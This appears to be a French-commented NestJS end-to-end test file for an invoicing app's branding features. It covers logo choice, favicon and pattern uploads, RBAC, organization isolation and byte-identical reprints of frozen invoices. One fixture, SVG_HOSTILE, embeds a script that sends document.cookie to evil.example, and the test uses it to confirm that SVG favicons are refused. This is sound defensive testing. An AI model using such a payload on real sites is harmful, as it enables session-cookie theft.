// Identité visuelle v2 contre la vraie application (ADR-0073).
//
// Même chaîne que `invoice-templates.e2e.test.ts` (cookie → AuthGuard →
// PermissionsGuard → MongoDB → MinIO → modèle → moteur de rendu ; faux serveur
// e-MCF local ; rendu Chromium remplacé par un double qui renvoie le HTML).
//
// Exigences prouvées : choix de logo unique (carré / horizontal, choix déduit
// des identités d'avant), nom retiré de la zone du logo sur une facture gelée
// APRÈS le réglage, raison sociale toujours imprimée ; favicon (PNG carré, SVG
// refusé, servi aux membres, révoqué au retrait) ; motif (bibliothèque, PNG
// transparent vérifié sur les pixels, opaque refusé) ; RBAC `organization.manage` ;
// isolation entre organisations ; facture gelée AVANT les réglages réimprimée
// octet pour octet ; motif figé au gel ; page publique d'un formulaire.
//
// Prérequis : MongoDB et MinIO (`S3_*`). BASE DÉDIÉE, supprimée à la fin.

import 'reflect-metadata';

import type { INestApplication } from '@nestjs/common';
import { ThrottlerStorage } from '@nestjs/throttler';
import type { Db } from 'mongodb';
import { ObjectId } from 'mongodb';
import { createHash, randomBytes } from 'node:crypto';
import request from 'supertest';
import { afterAll, beforeAll, beforeEach, expect, it, vi } from 'vitest';

import { BrandingService } from '../branding/branding.service.js';
import { startFakeEdefServer, type FakeEdefServer } from '../edef/testing/fake-edef-server.js';
import { PdfRenderingService } from '../reports/pdf-rendering.service.js';
import { rgbaPng, solidPng, testLogoBytes } from '../sales/documents/testing/template-fixtures.js';
import { contentSha256Of } from '../sales/invoices/canonical.js';
import { ObjectStorageService } from '../storage/object-storage.service.js';
import { dbOf, e2eSuite, makeE2EApp, registerAndLogin } from './e2e-utils.js';
import { E2E_HOOK_TIMEOUT_MS } from './e2e-timeouts.js';

const tag = randomBytes(4).toString('hex');
process.env['MONGODB_DB'] = `lalanda_e2e_identite_v2_${tag}`;
process.env['SECRETS_MASTER_KEY'] = randomBytes(32).toString('base64');
process.env['SECRETS_MASTER_KEY_ID'] = 'k1';
process.env['DGI_ISF_TEST'] = process.env['DGI_ISF_TEST'] || 'ISF-TEST-E2E';
process.env['DGI_HTTP_TIMEOUT_MS'] = '10000';
delete process.env['DGI_PRODUCTION_ENABLED'];

vi.setConfig({ testTimeout: 600_000 });

const S3_CONFIGURE = Boolean(
  process.env['S3_ENDPOINT'] &&
  process.env['S3_ACCESS_KEY'] &&
  process.env['S3_SECRET_KEY'] &&
  process.env['S3_BUCKET_UPLOADS'],
);

const MOT_DE_PASSE = 'Passw0rd!modeles';
const NIF_N = 'A0000000X';
const NIF_S = 'S0000000X';
const NIM = 'XX01000001-1';
const JETON = `ANTIFUITE-identite-${tag}-0123456789abcdef`;

const GROUPES: Record<string, number> = {
  a: 0,
  b: 16,
  c: 5,
  d: 0,
  e: 0,
  f: 16,
  g: 5,
  h: 0,
  i: 0,
  j: 0,
  k: 0,
  l: 0,
  m: 0,
  n: 0,
  o: 1,
  p: 1,
};

const LIGNE = {
  source: 'free',
  code: 'CONSEIL-H',
  name: 'Conseil (heure)',
  itemType: 'SER',
  taxGroup: 'B',
  outOfScope: false,
  unit: 'heure',
  quantity: '2',
  unitPrice: '40.00',
  specificTax: null,
  discount: null,
};

const SVG_HOSTILE = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">' +
    '<script>fetch("https://evil.example/"+document.cookie)</script></svg>',
);

type Compte = 'owner' | 'analyst' | 'ownerS';

function binary(req: request.Test): request.Test {
  return req.buffer(true).parse((res, cb) => {
    const chunks: Buffer[] = [];
    res.on('data', (c: Buffer) => chunks.push(c));
    res.on('end', () => cb(null, Buffer.concat(chunks)));
  });
}

const sha = (b: Buffer) => createHash('sha256').update(b).digest('hex');

e2eSuite('identité visuelle v2 (ADR-0073)', () => {
  let app: INestApplication;
  let db: Db;
  let fake: FakeEdefServer;
  let orgN = '';
  let orgS = '';
  let customerN = '';
  const cookies = {} as Record<Compte, string[]>;
  const emails = {} as Record<Compte, string>;

  const server = () => app.getHttpServer();
  const asN = (c: 'owner' | 'analyst' = 'owner') => [...cookies[c], `active_org_id=${orgN}`];
  const asS = () => [...cookies['ownerS'], `active_org_id=${orgS}`];
  const get = (c: string[], path: string) => request(server()).get(path).set('Cookie', c);
  const post = (c: string[], path: string, body?: unknown) =>
    request(server())
      .post(path)
      .set('Cookie', c)
      .send(body ?? {});
  const put = (c: string[], path: string, body: unknown) =>
    request(server()).put(path).set('Cookie', c).send(body);
  const del = (c: string[], path: string) => request(server()).delete(path).set('Cookie', c);
  const upload = (c: string[], variant: string, bytes: Buffer, type = 'image/png') =>
    request(server())
      .post(`/organizations/current/brand/logos/${variant}`)
      .set('Cookie', c)
      .set('Content-Type', type)
      .send(bytes);
  const pdf = (c: string[], id: string) =>
    binary(request(server()).get(`/sales/invoices/${id}/pdf`).set('Cookie', c));
  const duplicata = (c: string[], id: string) =>
    binary(request(server()).post(`/sales/invoices/${id}/duplicate`).set('Cookie', c).send({}));
  const text = (res: request.Response) => (res.body as Buffer).toString('utf8');
  const clearThrottle = () => {
    const store = app.get(ThrottlerStorage) as unknown as {
      storage: Map<string, unknown>;
      timeoutIds: Map<string, NodeJS.Timeout[]>;
    };
    for (const ids of store.timeoutIds.values()) ids.forEach(clearTimeout);
    store.timeoutIds.clear();
    store.storage.clear();
  };
  const enBase = (id: string) => db.collection('sales_invoices').findOne({ _id: new ObjectId(id) });
  const brand = async (c: string[] = asN()) => {
    const res = await get(c, '/organizations/current/brand');
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  };
  const choisir = async (templateId: string | null, options: Record<string, unknown> = {}) => {
    const cur = await get(asN(), '/sales/invoice-templates');
    const res = await put(asN(), '/sales/invoice-template', {
      templateId,
      options: { palette: null, accent: null, font: null, ...options },
      expectedRevision: cur.body.revision,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  };
  /** URL absolue de l'API → chemin, servi par l'application de test. */
  const chemin = (url: string) => new URL(url).pathname;

  const corps = (customerId: string) => ({
    type: 'FV',
    currency: 'USD',
    priceMode: 'ht',
    customer: { customerId, printContactDetails: false },
    pointOfSaleId: null,
    lines: [LIGNE],
    payments: [],
    comments: { A: null, C: null },
    creditNote: null,
    showUsdCounterValue: false,
  });

  async function brouillonPret(c: string[], customerId: string) {
    const body = corps(customerId);
    const d = await post(c, '/sales/invoices', body);
    expect(d.status, JSON.stringify(d.body)).toBe(201);
    const total = d.body.documentAmounts.calculation.totals.total as string;
    const res = await put(c, `/sales/invoices/${d.body.id}`, {
      ...body,
      payments: [{ method: 'VIREMENT', amount: total }],
      expectedRevision: d.body.revision,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  }

  async function normalisee() {
    const d = await brouillonPret(asN(), customerN);
    const res = await post(asN(), `/sales/invoices/${d.id}/normalize`, {
      expectedRevision: d.revision,
      exchangeRate: null,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(res.body.status).toBe('normalized');
    return res.body as Record<string, any>;
  }

  async function instantane(list: string, payload: unknown) {
    await db.collection('edef_reference_snapshots').insertOne({
      environment: 'test',
      list,
      sha256: randomBytes(32).toString('hex'),
      payload,
      fetchedAt: new Date(),
      _schemaVersion: 1,
    });
  }

  beforeAll(async () => {
    fake = await startFakeEdefServer({
      tokens: { [JETON]: { nif: NIF_N, nim: NIM, tokenValid: '2099-01-31T00:00:00' } },
      taxGroups: GROUPES,
    });
    process.env['DGI_EDEF_TEST_URL'] = fake.baseUrl;
    process.env['DGI_EDEF_PRODUCTION_URL'] = 'https://edef.invalid';
    app = await makeE2EApp();
    db = await dbOf(app);
    await new Promise<void>((resolve) => app.getHttpServer().listen(0, '127.0.0.1', resolve));

    vi.spyOn(app.get(PdfRenderingService), 'render').mockImplementation(async (html, opts) =>
      Buffer.from(
        `%PDF-FAKE\n${html}\n<!--header-->${opts?.headerTemplate ?? ''}\n<!--footer-->${opts?.footerTemplate ?? ''}\n<!--margin-->${JSON.stringify(opts?.margin ?? null)}`,
        'utf8',
      ),
    );

    for (const c of ['owner', 'analyst', 'ownerS'] as const) {
      emails[c] = `identite-${c}-${tag}@lalanda-test.local`;
    }
    const compte = (c: Compte) => ({ email: emails[c], password: MOT_DE_PASSE, name: `Mod ${c}` });
    const orgDe = async (c: Compte) => {
      cookies[c] = await registerAndLogin(app, compte(c));
      const orgs = await request(server()).get('/organizations').set('Cookie', cookies[c]);
      return (orgs.body.organizations as { id: string }[])[0]!.id;
    };
    orgN = await orgDe('owner');
    orgS = await orgDe('ownerS');
    const inv = await request(server())
      .post(`/organizations/${orgN}/invitations`)
      .set('Cookie', cookies['owner'])
      .send({ email: emails['analyst'], role: 'analyst' });
    expect(inv.status).toBe(201);
    cookies['analyst'] = await registerAndLogin(app, compte('analyst'));
    const acc = await request(server())
      .post('/invitations/accept')
      .set('Cookie', cookies['analyst'])
      .send({ token: inv.body.token });
    expect(acc.status).toBe(201);

    const fiche = (nif: string) => ({
      legalName: 'Exemple SARL',
      tradeName: null,
      legalForm: 'sarl',
      legalFormOther: null,
      nif,
      rccm: null,
      nationalId: null,
      vatRegistered: true,
      headOffice: {
        line1: '1, avenue Exemple',
        line2: null,
        commune: 'Gombe',
        city: 'Kinshasa',
        province: 'Kinshasa',
      },
      phone: '+243 800 000 000',
      email: 'contact@exemple.cd',
    });
    expect((await put(asN(), '/organizations/current/fiscal-profile', fiche(NIF_N))).status).toBe(
      200,
    );
    expect((await put(asS(), '/organizations/current/fiscal-profile', fiche(NIF_S))).status).toBe(
      200,
    );

    const reauth = async () =>
      expect((await post(cookies['owner'], '/me/reauth', { password: MOT_DE_PASSE })).status).toBe(
        200,
      );
    await reauth();
    const pos = await post(asN(), '/organizations/current/normalized-invoicing/points-of-sale', {
      label: 'Boutique',
      environment: 'test',
      expectedNim: null,
      token: JETON,
    });
    expect(pos.status, JSON.stringify(pos.body)).toBe(201);
    await reauth();
    const act = await post(asN(), '/organizations/current/normalized-invoicing/activate', {
      environment: 'test',
    });
    expect(act.status, JSON.stringify(act.body)).toBe(200);

    await instantane('taxGroups', GROUPES);
    await instantane('currencyRates', [
      {
        type: 'USD',
        description: 'Dollar (fictif)',
        date: '2026-10-19T00:00:00+01:00',
        rate: 2262.32,
      },
    ]);
    await instantane('clientTypes', [{ type: 'PM', description: 'Personne morale (fictif)' }]);
    await instantane('referenceTypes', [{ type: 'RRR', description: 'Remise (fictif)' }]);

    const cN = await post(asN(), '/sales/customers', {
      type: 'PM',
      name: 'Client Exemple SARL',
      nif: `T${tag.toUpperCase()}01`,
    });
    expect(cN.status, JSON.stringify(cN.body)).toBe(201);
    customerN = cN.body.id;
  }, E2E_HOOK_TIMEOUT_MS);

  beforeEach(() => clearThrottle());

  afterAll(async () => {
    try {
      if (app) {
        const d = await dbOf(app);
        const storage = app.get(ObjectStorageService);
        const bucket = storage.uploadsBucket();
        if (bucket) {
          for (const a of await d.collection('organization_brand_assets').find().toArray()) {
            await storage.deleteObject(bucket, a['objectKey'] as string).catch(() => undefined);
          }
        }
        await d.dropDatabase();
      }
    } finally {
      await app?.close();
      await fake?.close();
    }
  }, E2E_HOOK_TIMEOUT_MS);

  const brandPut = (c: string[], path: string, body: Record<string, unknown>) =>
    brand(c).then((b) =>
      put(c, `/organizations/current/brand/${path}`, { ...body, expectedRevision: b.revision }),
    );
  const image = (c: string[], path: string, bytes: Buffer, type = 'image/png') =>
    request(server())
      .post(`/organizations/current/brand/${path}`)
      .set('Cookie', c)
      .set('Content-Type', type)
      .send(bytes);
  const transparent = () => rgbaPng(128, 128, (x, y) => ((x + y) % 8 === 0 ? 255 : 0));

  it('RBAC : l’analyste ne règle ni le choix du logo, ni le favicon, ni le motif ; il lit le favicon', async () => {
    const a = asN('analyst');
    expect(
      (
        await put(a, '/organizations/current/brand/logo-choice', {
          logoChoice: 'square',
          expectedRevision: 0,
        })
      ).status,
    ).toBe(403);
    expect(
      (
        await put(a, '/organizations/current/brand/pattern', {
          source: 'none',
          libraryId: null,
          intensity: 8,
          expectedRevision: 0,
        })
      ).status,
    ).toBe(403);
    expect((await image(a, 'favicon', solidPng(64, 64, [1, 2, 3]))).status).toBe(403);
    expect((await image(a, 'pattern-image', transparent())).status).toBe(403);
    expect((await del(a, '/organizations/current/brand/favicon')).status).toBe(403);
    const fav = await get(a, '/organizations/current/favicon');
    expect(fav.status).toBe(200);
    expect(fav.body).toEqual({ url: null });
    // Sans session : 401.
    expect((await request(server()).get('/organizations/current/favicon')).status).toBe(401);
  });

  it('validation : choix et motif hors liste refusés, intensité bornée, révision optimiste', async () => {
    const b = await brand();
    expect(b['logoChoice']).toBeNull();
    expect(b['effectiveLogoChoice']).toBe('square');
    expect(b['patterns'].length).toBeGreaterThanOrEqual(8);
    expect(b['pattern']).toEqual({ source: 'none', libraryId: null, intensity: 8 });
    expect((await brandPut(asN(), 'logo-choice', { logoChoice: 'rond' })).status).toBe(400);
    expect(
      (await brandPut(asN(), 'pattern', { source: 'library', libraryId: 'inconnu', intensity: 8 }))
        .status,
    ).toBe(400);
    expect(
      (await brandPut(asN(), 'pattern', { source: 'library', libraryId: 'points', intensity: 60 }))
        .status,
    ).toBe(400);
    expect(
      (await brandPut(asN(), 'pattern', { source: 'library', libraryId: null, intensity: 8 }))
        .status,
    ).toBe(400);
    expect(
      (await brandPut(asN(), 'pattern', { source: 'upload', libraryId: null, intensity: 8 }))
        .status,
    ).toBe(409);
    const stale = await put(asN(), '/organizations/current/brand/logo-choice', {
      logoChoice: 'square',
      expectedRevision: b.revision + 99,
    });
    expect(stale.status).toBe(409);
    expect(stale.body.code).toBe('STALE_BRAND_REVISION');
  });

  it.skipIf(!S3_CONFIGURE)(
    'favicon : PNG carré seulement, SVG refusé, servi aux membres et aux pages publiques, révoqué au retrait',
    async () => {
      expect((await image(asN(), 'favicon', SVG_HOSTILE, 'image/svg+xml')).status).toBe(415);
      expect((await image(asN(), 'favicon', SVG_HOSTILE, 'application/octet-stream')).status).toBe(
        415,
      );
      expect((await image(asN(), 'favicon', solidPng(128, 64, [1, 2, 3]))).status).toBe(422);
      const ok = await image(asN(), 'favicon', solidPng(64, 64, [15, 81, 50]));
      expect(ok.status, JSON.stringify(ok.body)).toBe(201);
      expect(ok.body.favicon.width).toBe(64);
      const fav = await get(asN('analyst'), '/organizations/current/favicon');
      expect(fav.body.url).toMatch(/\/brand-assets\//);
      const served = await binary(request(server()).get(chemin(fav.body.url)));
      expect(served.status).toBe(200);
      expect(served.headers['content-type']).toBe('image/png');
      // Isolation : l'autre organisation n'a pas de favicon.
      expect((await get(asS(), '/organizations/current/favicon')).body).toEqual({ url: null });
      // Retrait : l'URL distribuée ne sert plus rien.
      expect((await del(asN(), '/organizations/current/brand/favicon')).status).toBe(200);
      expect((await request(server()).get(chemin(fav.body.url))).status).toBe(404);
      expect((await get(asN(), '/organizations/current/favicon')).body).toEqual({ url: null });
      await image(asN(), 'favicon', solidPng(64, 64, [15, 81, 50]));
    },
  );

  it.skipIf(!S3_CONFIGURE)(
    'motif téléversé : un PNG opaque est refusé, un PNG transparent accepté',
    async () => {
      const opaque = await image(asN(), 'pattern-image', solidPng(128, 128, [10, 10, 10]));
      expect(opaque.status).toBe(422);
      expect(opaque.body.code).toBe('PATTERN_NOT_TRANSPARENT');
      const plein = await image(
        asN(),
        'pattern-image',
        rgbaPng(128, 128, () => 255),
      );
      expect(plein.status).toBe(422);
      expect(
        (
          await image(
            asN(),
            'pattern-image',
            rgbaPng(32, 32, () => 0),
          )
        ).status,
      ).toBe(422);
      const ok = await image(asN(), 'pattern-image', transparent());
      expect(ok.status, JSON.stringify(ok.body)).toBe(201);
      expect(ok.body.patternImage.width).toBe(128);
      const choix = await brandPut(asN(), 'pattern', {
        source: 'upload',
        libraryId: null,
        intensity: 6,
      });
      expect(choix.status, JSON.stringify(choix.body)).toBe(200);
      expect(choix.body.pattern).toEqual({ source: 'upload', libraryId: null, intensity: 6 });
      // Retirer l'image retire le motif.
      const retire = await del(asN(), '/organizations/current/brand/pattern-image');
      expect(retire.body.removed).toBe(true);
      expect(retire.body.pattern.source).toBe('none');
    },
  );

  it.skipIf(!S3_CONFIGURE)(
    'documents : le choix et le motif valent pour les factures gelées APRÈS ; une facture gelée AVANT se réimprime à l’identique',
    async () => {
      expect((await upload(asN(), 'primary', testLogoBytes('primary'))).status).toBe(201);
      expect((await upload(asN(), 'horizontal', testLogoBytes('horizontal'))).status).toBe(201);
      await choisir('classique');
      // Facture gelée AVANT tout réglage v2 (motif : aucun).
      const avant = await normalisee();
      const avantPdf = (await pdf(asN(), avant.id)).body as Buffer;
      const docAvant = await enBase(avant.id);
      const pAvant = docAvant?.['presentation'] as any;
      expect(pAvant.template).toEqual({ id: 'classique', version: '1.2.0' });
      expect(pAvant.pattern).toBeUndefined();
      expect(pAvant.identity.logoChoice).toBe('square');
      expect(text({ body: avantPdf } as request.Response)).toContain('data-variant="primary"');

      // Réglages : horizontal + motif de la bibliothèque.
      expect((await brandPut(asN(), 'logo-choice', { logoChoice: 'horizontal' })).status).toBe(200);
      expect(
        (
          await brandPut(asN(), 'pattern', {
            source: 'library',
            libraryId: 'losanges',
            intensity: 10,
          })
        ).status,
      ).toBe(200);

      // La facture d'avant : octet pour octet.
      expect(sha((await pdf(asN(), avant.id)).body as Buffer)).toBe(sha(avantPdf));

      // Une nouvelle facture : logo horizontal, motif figé, raison sociale au bloc légal.
      const apres = await normalisee();
      const html = text(await pdf(asN(), apres.id));
      expect(html).toContain('data-variant="horizontal"');
      expect(html).not.toContain('data-variant="primary"');
      expect(html).toContain('class="lx-pattern"');
      expect(html).toContain('opacity: 0.10');
      expect(html).toContain('<div>Exemple SARL</div>');
      expect(html).not.toContain('font-size:15px;font-weight:700">Exemple SARL');
      const pApres = (await enBase(apres.id))?.['presentation'] as any;
      expect(pApres.pattern).toEqual({
        source: 'library',
        id: 'losanges',
        color: '#0f5132',
        intensity: 10,
      });
      expect(pApres.identity.logoChoice).toBe('horizontal');
      // L'empreinte du document couvre le motif figé.
      const d = await enBase(apres.id);
      expect(d?.['contentSha256']).toBe(contentSha256Of(d as any));
      // Duplicata : même présentation figée.
      const dup = text(await duplicata(asN(), apres.id));
      expect(dup).toContain('class="lx-pattern"');
      // Changer encore les réglages ne touche pas la facture d'après.
      const apresPdf = sha((await pdf(asN(), apres.id)).body as Buffer);
      await brandPut(asN(), 'pattern', { source: 'none', libraryId: null, intensity: 8 });
      expect(sha((await pdf(asN(), apres.id)).body as Buffer)).toBe(apresPdf);
      // Isolation : l'autre organisation garde ses réglages par défaut.
      const s = await brand(asS());
      expect(s['pattern'].source).toBe('none');
      expect(s['logoChoice']).toBeNull();
    },
  );

  it.skipIf(!S3_CONFIGURE)(
    'migration douce : une identité d’avant (sans choix) déduit le choix de ses logos',
    async () => {
      // L'autre organisation n'a qu'un logo horizontal.
      expect((await upload(asS(), 'horizontal', testLogoBytes('horizontal'))).status).toBe(201);
      const s = await brand(asS());
      expect(s['logoChoice']).toBeNull();
      expect(s['effectiveLogoChoice']).toBe('horizontal');
      const p = await app.get(BrandingService).presentationToFreeze(orgS);
      expect(p).toBeNull(); // aucun modèle choisi : présentation d'origine, inchangée
    },
  );
});
